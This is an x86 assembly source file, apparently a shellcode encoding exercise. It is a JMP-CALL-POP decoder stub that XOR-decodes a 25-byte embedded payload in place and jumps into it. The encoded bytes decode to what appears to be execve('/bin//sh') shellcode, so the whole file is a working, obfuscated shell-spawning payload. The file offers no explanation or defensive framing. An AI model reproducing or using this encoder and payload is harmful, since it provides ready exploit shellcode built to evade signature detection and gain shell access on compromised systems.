global _start

payload_size equ 25 ; payload size without iv

section .text

_start:
    ; Copy the address of the encoded payload to ESI.
    jmp call_decoder
    
decoder:
    pop esi
    ; Initialize ECX to the payload size to use it as a loop counter.
    xor ecx, ecx
    mov cl, payload_size
    xor eax, eax

decode:
    ; Decode a byte of the payload and loop.
    mov al, [esi + 1]
    xor [esi], al
    inc esi
    loop decode
    
    ; Execute the payload.
    jmp payload

call_decoder:
    call decoder
    payload: db 0x46, 0x77, 0xb7, 0xe7, 0x8f, 0xa0, 0x8f, 0xfc, 0x94, 0xfc, 0xd3, 0xb1, 0xd8, 0xb6, 0x3f, 0xdc, 0x8c, 0x05, 0xe7, 0xb4, 0x3d, 0xdc, 0x6c, 0x67, 0xaa, 0x2a

